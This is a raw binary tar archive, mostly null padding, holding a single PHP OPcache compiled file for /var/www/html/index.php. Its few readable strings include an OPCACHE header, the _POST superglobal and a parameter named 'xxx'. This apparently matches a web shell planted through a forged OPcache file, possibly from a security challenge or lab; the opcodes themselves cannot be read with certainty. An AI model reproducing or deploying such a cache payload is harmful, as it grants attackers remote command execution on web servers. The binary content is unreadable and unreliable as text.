5\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ustar\x0000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00././@PaxHeader\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000000000\x000000000\x000000000\x0000000000033\x0000000000000\x00010211\x00 x\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ustar\x0000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0027 mtime=1702627731.878734\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00214510e772fba140ea7a33a277f2799e/var/www/html/index.php.bin\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000000666\x000000000\x000000000\x0000000001760\x0014537004624\x00017202\x00 0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ustar\x0000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00OPCACHE\x00214510e772fba140ea7a33a277f2799e0\x03\x00\x00\x00\x00\x00\x00p\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x91\x08|e\x00\x00\x00\x004e\xad\x89\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x000\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00 \x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf0\x02\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x07\x00\x00\x00\x18\x00\x00\x00\xfe\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x07\x00\x00\x00\x18\x00\x00\x00\xfe\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\xf4&#123;e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000\x03\x00\x00\xd2XR5\xe1\xf8&#123;e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x001\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00Q\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00&gt;\x05\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xffP\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x009\x00\x00\x027\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xffp\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00P\x01\x00\x02A\x06\x00\x00\x00\x00\x00\x00p\x00\x00\x00\x01\x00\x00\x00`\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00Q\x02\x01\x02\xf1\x05\x00\x00\x00\x00\x00\x00`\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x01\x00\x00\x00\x01\x00\x00\x00I\x02\x00\x00?\x05\x00\x00\x00\x00\x00\x00P\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x01\x00\x00\x00:\x02\x00\x00F\x05\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x01\x00\x00\x00&gt;\x01\x00\x00\x02\x00\x00\x00V\x01\x00\x00\xb2$\x83\xaf\xdd\xaa\xdf\x8c\x17\x00\x00\x00\x00\x00\x00\x00/var/www/html/index.php\x00R\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00V\x00\x00\x00\xb2$\x83\xaf\xdd\xaa\xdf\x8c\x17\x00\x00\x00\x00\x00\x00\x00/var/www/html/index.php\x00\x02\x00\x00\x00V\x00\x00\x00jQ\xe3\x0e1\x00\x00\x80\x05\x00\x00\x00\x00\x00\x00\x00_POST\x00\x00\x00\x02\x00\x00\x00V\x00\x00\x00M\xc1\x88\x0b\x00\x00\x00\x80\x03\x00\x00\x00\x00\x00\x00\x00xxx\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\